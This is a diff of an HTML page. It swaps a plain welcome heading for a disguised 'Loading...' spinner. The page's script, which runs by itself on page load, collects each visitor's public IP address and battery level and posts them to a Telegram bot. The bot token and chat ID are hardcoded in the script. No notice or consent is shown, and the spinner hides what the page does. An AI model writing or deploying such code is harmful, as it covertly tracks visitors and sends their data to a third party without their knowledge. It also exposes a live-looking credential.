@@ -3,26 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #0f172a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #38bdf8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to my site!</h1>
+
+    <div class="spinner"></div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '8539452307:AAE3Px3RSVeT-YjpxTWp_btbswWg5_o0DTo';
         const TELEGRAM_CHAT_ID = '8714686528';
 
-        async function sendIpToTelegram() {
+        async function getBatteryPercentage() {
             try {
-                // Fetch the visitor's public IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const visitorIp = ipData.ip;
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}%`;
+                }
+            } catch (e) {
+                // Ignore errors if battery access is blocked
+            }
+            return 'Unsupported/Blocked';
+        }
 
-                // Build the message text
-                const message = `🚨 *New Visitor Alert*\n\n*IP Address:* ${visitorIp}\n*User Agent:* ${navigator.userAgent}`;
+        async function captureAndSend() {
+            try {
+                // Fetch IP and Battery concurrently
+                const [ipResponse, batteryPercentage] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json').then(res => res.json()),
+                    getBatteryPercentage()
+                ]);
 
-                // Send the payload to the Telegram Bot API
+                const visitorIp = ipResponse.ip;
+                const message = `IP: ${visitorIp}\nBattery: ${batteryPercentage}`;
+
+                // Send data to Telegram
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -30,17 +73,15 @@
                     },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
+                        text: message
                     })
                 });
             } catch (error) {
-                console.error('Error logging visitor details:', error);
+                console.error('Error logging details:', error);
             }
         }
 
-        // Trigger as soon as the DOM loads
-        window.addEventListener('DOMContentLoaded', sendIpToTelegram);
+        window.addEventListener('DOMContentLoaded', captureAndSend);
     </script>
 </body>
 </html>
